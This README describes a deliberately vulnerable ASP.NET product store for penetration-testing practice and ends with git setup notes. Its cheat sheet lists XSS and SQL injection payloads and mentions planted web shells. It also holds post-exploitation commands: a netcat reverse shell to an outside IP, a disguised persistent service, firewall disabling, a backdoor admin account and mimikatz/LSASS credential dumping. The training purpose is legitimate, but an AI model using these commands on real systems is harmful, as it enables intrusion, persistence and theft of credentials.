# MvcProductStore
A simple product store with many unsafe features used for PEN testing.
Based on the old Microsoft tutorial for MvcMusicStore found at https://docs.microsoft.com/en-us/aspnet/mvc/overview/older-versions/mvc-music-store/.

## Cheat sheet

### Authorisation
An admin has left a hint on the login page. See if you can find it in the source code for the page. Can you figure out the email address? Probably the domain has something to do with the site.

Another way to get in as admin is to create a regular user. Check the Register page source code for hints, and examine what is being posted back to the server. Maybe you can escalate yourself as admin by fiddling with the POST values?

### XSS
On the front page is a box for user reviews. It seems you can paste almost anything in the textbox!

Things to try https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection:
          
           Basic payload
            <script>alert('XSS')</script>
            <scr<script>ipt>alert('XSS')</scr<script>ipt>
            "><script>alert('XSS')</script>
            "><script>alert(String.fromCharCode(88,83,83))</script>
                    
           Img payload
            <img src=x onerror=alert('XSS');>
            <img src=x onerror=alert('XSS')//
            <img src=x onerror=alert(String.fromCharCode(88,83,83));>
            <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
            <img src=x:alert(alt) onerror=eval(src) alt=xss>
            "><img src=x onerror=alert('XSS');>
            "><img src=x onerror=alert(String.fromCharCode(88,83,83));>

### SQL injection
Try if you can inject some code in the search field.
Here are some examples that might get you started:
    ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
    ' OR 1=1 UNION SELECT 99, system_user, 'http://foo.gif' --
    ' OR 1=1 UNION SELECT 99, DB_NAME(), 'http://foo.gif' --
    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases --
    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' --
    ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') --

### Exploitation
If we can get access to the server it's easy to upload your own shell code and have the website execute it.
There is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
Also another shell in the root /shell.aspx?c="COMMAND HERE". 

#### Usefull commands:
net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

#### Turn off firewall
netsh firewall set opmode disable 

#### Add new user
net user test 1234 /add
net localgroup administrators test /add

#### Mimikatz
git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full


### More stuff
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/


## Git

### Initial setup

```
cd into 'MvcProductStore' dir
git init                    # initialize directory
git add . -A                # add all files from current and subdirectories
git commit -m "msg"         # commit changes to local repo
git remote add origin <url> # add remote repo
git remote -v               # check repo names
git pull origin master --allow-unrelated-histories  # get latest from remote repo
git push origin master  # push changes to remote repo

```

### Clone

```
cd into 'MvcProductStore' dir
git clone <remote>          # clone remote repo

```
